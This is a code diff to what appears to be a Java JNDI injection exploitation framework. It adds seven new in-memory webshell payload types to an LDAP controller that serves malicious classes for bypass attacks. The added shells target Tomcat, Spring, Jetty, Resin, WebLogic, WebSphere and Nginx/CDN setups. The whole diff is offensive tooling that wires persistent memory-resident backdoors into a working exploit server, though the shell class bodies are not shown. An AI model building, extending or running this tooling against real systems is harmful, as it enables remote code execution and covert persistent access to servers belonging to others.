@@ -8,7 +8,12 @@ import com.qi4l.jndi.exceptions.UnSupportedPayloadTypeException;
 import com.qi4l.jndi.gadgets.utils.InjShell;
 import com.qi4l.jndi.template.*;
 import com.qi4l.jndi.template.Agent.WinMenshell;
+import com.qi4l.jndi.template.memshell.BypassNginxCDN.cmsMSBYNC;
+import com.qi4l.jndi.template.memshell.BypassNginxCDN.proxyMSBYNC;
+import com.qi4l.jndi.template.memshell.Tomcat_Spring_Jetty.MsTSJproxy;
+import com.qi4l.jndi.template.memshell.Tomcat_Spring_Jetty.MsTSJser;
 import com.qi4l.jndi.template.memshell.Websphere.WSFMSFromThread;
+import com.qi4l.jndi.template.memshell.Websphere.WSWebsphereProxy;
 import com.qi4l.jndi.template.memshell.Websphere.websphereEcho;
 import com.qi4l.jndi.template.echo.*;
 import com.qi4l.jndi.template.memshell.jboss.JBFMSFromContextF;
@@ -20,6 +25,7 @@ import com.qi4l.jndi.template.echo.jettyEcho;
 import com.qi4l.jndi.template.memshell.resin.RFMSFromThreadF;
 import com.qi4l.jndi.template.memshell.resin.RSMSFromThreadS;
 import com.qi4l.jndi.template.echo.resinEcho;
+import com.qi4l.jndi.template.memshell.resin.WsResin;
 import com.qi4l.jndi.template.memshell.spring.SpringControllerMS;
 import com.qi4l.jndi.template.memshell.spring.SpringInterceptorMS;
 import com.qi4l.jndi.gadgets.Config.Config;
@@ -29,6 +35,7 @@ import com.qi4l.jndi.gadgets.utils.ClassNameUtils;
 import com.qi4l.jndi.gadgets.utils.HexUtils;
 import com.qi4l.jndi.template.memshell.struts2.Struts2ActionMS;
 import com.qi4l.jndi.template.memshell.tomcat.*;
+import com.qi4l.jndi.template.memshell.weblogic.WsWeblogic;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
@@ -179,6 +186,27 @@ public class TomcatBypassController implements LdapController {
                 case allecho:
                     code = helper.injectAllEcho();
                     break;
+                case cmsmsbync:
+                    code = helper.injectcmsMSBYNC();
+                    break;
+                case proxymsbync:
+                    code = helper.injectproxyMSBYNC();
+                    break;
+                case wsresin:
+                    code = helper.injectWsResin();
+                    break;
+                case mstsjser:
+                    code = helper.injectMsTSJser();
+                    break;
+                case mstsjproxy:
+                    code = helper.injectMsTSJproxy();
+                    break;
+                case wsweblogic:
+                    code = helper.injectWsWeblogic();
+                    break;
+                case wswebsphereproxy:
+                    code = helper.injectWSWebsphereProxy();
+                    break;
             }
             // 创建有效负载所需的字符串模板，将其中的 {replacement} 替换为上面获取到的代码
             String payloadTemplate = "{" +
@@ -210,7 +238,7 @@ public class TomcatBypassController implements LdapController {
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
         try {
-            base = base.replace('\\','/');
+            base = base.replace('\\', '/');
             // 获取第一个斜杠的索引
             int fistIndex = base.indexOf("/");
             // 获取第二个斜杠的索引
@@ -393,6 +421,34 @@ public class TomcatBypassController implements LdapController {
 
         public String injectAllEcho() {
             return InjShell.injectClass(AllEcho.class);
+        }
+
+        public String injectcmsMSBYNC() {
+            return InjShell.injectClass(cmsMSBYNC.class);
+        }
+
+        public String injectproxyMSBYNC() {
+            return InjShell.injectClass(proxyMSBYNC.class);
+        }
+
+        public String injectWsResin() {
+            return InjShell.injectClass(WsResin.class);
+        }
+
+        public String injectMsTSJser() {
+            return InjShell.injectClass(MsTSJser.class);
+        }
+
+        public String injectMsTSJproxy() {
+            return InjShell.injectClass(MsTSJproxy.class);
+        }
+
+        public String injectWsWeblogic() {
+            return InjShell.injectClass(WsWeblogic.class);
+        }
+
+        public String injectWSWebsphereProxy() {
+            return InjShell.injectClass(WSWebsphereProxy.class);
         }
 
         public String injectSuccess() {
